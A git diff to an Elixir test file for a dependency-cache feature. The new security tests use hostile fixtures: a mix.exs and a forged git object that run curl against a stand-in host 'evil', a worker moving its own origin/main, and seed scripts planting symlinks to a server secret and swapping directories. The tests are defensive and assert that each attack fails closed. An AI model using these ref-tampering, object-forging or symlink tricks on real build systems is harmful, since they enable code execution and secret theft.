@@ -39,58 +39,73 @@ defmodule Wardmast.Screenshots.Capture.DepsCacheTest do
 
   defp repo!(dir) do
     repo = Path.join(dir, "repo")
+    forge = Path.join(dir, "forge.git")
     File.mkdir_p!(repo)
+    git!(dir, ["init", "-q", "--bare", "-b", "main", forge])
     git!(dir, ["init", "-q", "-b", "main", repo])
     git!(repo, ["config", "user.email", "t@example.com"])
     git!(repo, ["config", "user.name", "t"])
+    git!(repo, ["remote", "add", "origin", forge])
     repo
   end
 
-  # main: base (lock L1), the branch: head.
+  # What origin's default branch is: the trust anchor (`git ls-remote`).
+  defp push!(repo, branch \\ "main"), do: git!(repo, ["push", "-q", "origin", branch])
+
+  # main (pushed to origin): base (lock L1); the branch: head.
   defp branch!(dir, head_files, base_files \\ %{"mix.lock" => "%{lock: 1}\n"}) do
     repo = repo!(dir)
     base = commit!(repo, Map.merge(%{"web/page.txt" => "v1"}, base_files), "base")
+    push!(repo)
     git!(repo, ["checkout", "-q", "-b", "feature"])
     head = commit!(repo, Map.merge(%{"web/page.txt" => "v2"}, head_files), "head")
     {repo, base, head}
   end
 
-  describe "plan/4: which lockfile is trusted" do
+  defp plan(repo, base, head, branch \\ "main"),
+    do:
+      DepsCache.plan(repo, base, head, branch, root: Path.join(Path.dirname(repo), "trust-root"))
+
+  describe "plan/5: which lockfile is trusted" do
     test "an unchanged lockfile at a merge-base on the default branch: that commit", %{
       tmp_dir: dir
     } do
       {repo, base, head} = branch!(dir, %{})
       hash = :crypto.hash(:sha256, "%{lock: 1}\n") |> Base.encode16(case: :lower)
 
-      assert {:ok, %{source: ^base, lock_hash: ^hash}} = DepsCache.plan(repo, base, head, "main")
+      assert {:ok, %{source: ^base, lock_hash: ^hash, repo: trusted}} = plan(repo, base, head)
+      # The source lives in a repository of the server's own, outside the checkout.
+      refute String.starts_with?(trusted, repo)
+      assert {_, 0} = System.cmd("git", ["-C", trusted, "cat-file", "-e", base <> "^{commit}"])
     end
 
     test "a head that edits, adds or deletes mix.lock is skipped (deps_changed)", %{tmp_dir: dir} do
       {repo, base, head} = branch!(Path.join(dir, "edit"), %{"mix.lock" => "%{lock: 2}\n"})
-      assert {:skip, reason} = DepsCache.plan(repo, base, head, "main")
+      assert {:skip, reason} = plan(repo, base, head)
       assert reason =~ "edits mix.lock"
       assert reason =~ "default branch"
 
       {repo, base, head} =
         branch!(Path.join(dir, "add"), %{"mix.lock" => "%{lock: 1}\n"}, %{"README" => "r"})
 
-      assert {:skip, reason} = DepsCache.plan(repo, base, head, "main")
+      assert {:skip, reason} = plan(repo, base, head)
       assert reason =~ "adds a mix.lock"
 
       {repo, base, head} = branch!(Path.join(dir, "delete"), %{"mix.lock" => :delete})
-      assert {:skip, reason} = DepsCache.plan(repo, base, head, "main")
+      assert {:skip, reason} = plan(repo, base, head)
       assert reason =~ "deletes mix.lock"
     end
 
     test "no lockfile at either commit: nothing to cache", %{tmp_dir: dir} do
       {repo, base, head} = branch!(dir, %{}, %{"README" => "r"})
-      assert {:ok, :none} = DepsCache.plan(repo, base, head, "main")
+      assert {:ok, :none} = plan(repo, base, head)
     end
 
     test "a merge-base off the default branch: only when the default branch has that lockfile",
          %{tmp_dir: dir} do
       repo = repo!(dir)
       root = commit!(repo, %{"web/page.txt" => "v0", "mix.lock" => "%{lock: 1}\n"}, "root")
+      push!(repo)
       # A release branch the PR targets, which main never merged.
       git!(repo, ["checkout", "-q", "-b", "release"])
       base = commit!(repo, %{"web/page.txt" => "r1"}, "release work")
@@ -98,21 +113,65 @@ defmodule Wardmast.Screenshots.Capture.DepsCacheTest do
       head = commit!(repo, %{"web/page.txt" => "r2"}, "feature work")
 
       # main still has the same lockfile: its own tip is the trusted source.
-      main_tip = git!(repo, ["rev-parse", "main"])
-      assert main_tip == root
-      assert {:ok, %{source: ^main_tip}} = DepsCache.plan(repo, base, head, "main")
+      assert {:ok, %{source: ^root}} = plan(repo, base, head)
 
       # main moved its lockfile on: nothing on the default branch vouches for this one.
       git!(repo, ["checkout", "-q", "main"])
       commit!(repo, %{"mix.lock" => "%{lock: 9}\n"}, "main bumps deps")
-      assert {:skip, reason} = DepsCache.plan(repo, base, head, "main")
+      push!(repo)
+      assert {:skip, reason} = plan(repo, base, head)
       assert reason =~ "default branch"
     end
 
-    test "a default branch the repo does not have is an error, not a guess", %{tmp_dir: dir} do
+    test "a default branch origin does not have is an error, not a guess", %{tmp_dir: dir} do
       {repo, base, head} = branch!(dir, %{})
-      assert {:error, message} = DepsCache.plan(repo, base, head, "trunk")
+      assert {:error, message} = plan(repo, base, head, "trunk")
       assert message =~ "trunk"
+    end
+
+    # The worker's refs are writable from its jail: moving its `origin/main` (and `main`) onto a
+    # commit of its own, with the same lockfile and a mix.exs of its choosing, must not make that
+    # commit the one the seed runs with the network on.
+    test "a worker that moves its own origin/main cannot choose the source", %{tmp_dir: dir} do
+      repo = repo!(dir)
+      tip = commit!(repo, %{"web/page.txt" => "v1", "mix.lock" => "%{lock: 1}\n"}, "main")
+      push!(repo)
+      git!(repo, ["checkout", "-q", "-b", "evil"])
+      evil = commit!(repo, %{"mix.exs" => "System.cmd(\"curl\", [\"evil\"])"}, "evil mix.exs")
+      git!(repo, ["update-ref", "refs/remotes/origin/main", evil])
+      git!(repo, ["update-ref", "refs/heads/main", evil])
+      git!(repo, ["checkout", "-q", "-b", "feature"])
+      head = commit!(repo, %{"web/page.txt" => "v2"}, "feature")
+
+      # The local merge-base with the doctored origin/main is the worker's own commit...
+      assert git!(repo, ["merge-base", "origin/main", "HEAD"]) == evil
+
+      # ...but the source is origin's real tip, and the worker's commit never enters the trusted
+      # repository.
+      assert {:ok, %{source: ^tip, repo: trusted}} = plan(repo, evil, head)
+
+      assert {_, status} =
+               System.cmd("git", ["-C", trusted, "cat-file", "-e", evil], stderr_to_stdout: true)
+
+      refute status == 0
+    end
+
+    # The worker's object store is writable too: an object forged under the trusted tip's name
+    # never reaches the trusted repository, so the seed fails closed instead of running it.
+    test "an object forged in the worker's store fails closed", %{tmp_dir: dir} do
+      {repo, base, head} = branch!(dir, %{})
+      blob = git!(repo, ["rev-parse", base <> ":web/page.txt"])
+
+      loose =
+        Path.join([repo, ".git", "objects", binary_part(blob, 0, 2), binary_part(blob, 2, 38)])
+
+      assert File.regular?(loose)
+      forged = "System.cmd(\"curl\", [\"evil\"])\n"
+      File.chmod!(loose, 0o644)
+      File.write!(loose, :zlib.compress("blob #{byte_size(forged)}\0" <> forged))
+
+      assert {:error, message} = plan(repo, base, head)
+      assert message =~ "trusted repository"
     end
   end
 
@@ -168,7 +227,7 @@ defmodule Wardmast.Screenshots.Capture.DepsCacheTest do
       assert File.read!(ctx.log) == "seeded\n"
 
       # Nothing of the seed's work is left beside the cache.
-      assert File.ls!(ctx.root) == [Path.basename(cache.dir)]
+      assert Enum.reject(File.ls!(ctx.root), &(&1 == "repos")) == [Path.basename(cache.dir)]
     end
 
     test "the boot is pointed at the cache: offline, and the asset tools linked", ctx do
@@ -226,12 +285,62 @@ defmodule Wardmast.Screenshots.Capture.DepsCacheTest do
       refute env =~ ~r/^HTTP_PROXY=/m
     end
 
+    # Whatever the seed leaves is untrusted to the host: a symlink it plants is never followed by
+    # the host-side copy, write or rename that publishes the cache.
+    test "a seed's symlinks are never followed by the host", %{tmp_dir: dir} = ctx do
+      secret = Path.join(dir, "server-secret")
+      File.write!(secret, "SECRET")
+      victim = Path.join(dir, "victim-dir")
+      File.mkdir_p!(victim)
+
+      script = """
+      set -e
+      mkdir -p "$MIX_DEPS_PATH" _build
+      ln -s "#{secret}" _build/esbuild-linux-x64
+      ln -s "#{victim}" "$MIX_DEPS_PATH/../bin"
+      ln -s "#{secret}" "$MIX_DEPS_PATH/../.complete"
+      """
+
+      assert {:ok, cache} =
+               DepsCache.prepare(
+                 input(ctx.repo, ctx.base, ctx.head),
+                 Keyword.put(ctx.opts, :seed_script, script)
+               )
+
+      # The planted tool was not copied (it is not a regular file), so no tool env or link...
+      refute Enum.any?(cache.env, &match?({"MIX_ESBUILD_PATH", _}, &1))
+      assert cache.links == []
+      # ...nothing was written through the planted links, and the cache's own bin and stamp are
+      # real.
+      assert File.read!(secret) == "SECRET"
+      assert File.ls!(victim) == []
+      assert {:ok, %File.Stat{type: :directory}} = File.lstat(Path.join(cache.dir, "bin"))
+      assert {:ok, %File.Stat{type: :regular}} = File.lstat(Path.join(cache.dir, ".complete"))
+      assert {:ok, %File.Stat{type: :directory}} = File.lstat(cache.dir)
+    end
+
+    test "a seed that swaps a cache directory for a symlink publishes nothing",
+         %{tmp_dir: dir} = ctx do
+      elsewhere = Path.join(dir, "elsewhere")
+      File.mkdir_p!(elsewhere)
+      script = ~s(set -e\nrm -rf "$MIX_DEPS_PATH"\nln -s \"#{elsewhere}\" "$MIX_DEPS_PATH"\n)
+
+      assert {:error, message} =
+               DepsCache.prepare(
+                 input(ctx.repo, ctx.base, ctx.head),
+                 Keyword.put(ctx.opts, :seed_script, script)
+               )
+
+      assert message =~ "deps"
+      assert Enum.reject(File.ls!(ctx.root), &(&1 == "repos")) == []
+    end
+
     test "a seed that fails is an error with its output, and publishes nothing", ctx do
       opts = Keyword.put(ctx.opts, :seed_script, "echo 'mix deps.get: nxdomain' >&2; exit 1")
 
       assert {:error, message} = DepsCache.prepare(input(ctx.repo, ctx.base, ctx.head), opts)
       assert message =~ "nxdomain"
-      assert File.ls!(ctx.root) == []
+      assert Enum.reject(File.ls!(ctx.root), &(&1 == "repos")) == []
     end
 
     test "a head that changes mix.lock never seeds anything", ctx do
@@ -330,6 +439,7 @@ defmodule Wardmast.Screenshots.Capture.DepsCacheTest do
       File.rm_rf!(Path.join(repo, "_build"))
       assert File.read!(Path.join(repo, "mix.lock")) =~ "tiny"
       base = commit!(repo, %{}, "base")
+      push!(repo)
       git!(repo, ["checkout", "-q", "-b", "feature"])
       head = commit!(repo, %{"web/page.txt" => "v2"}, "head")
 
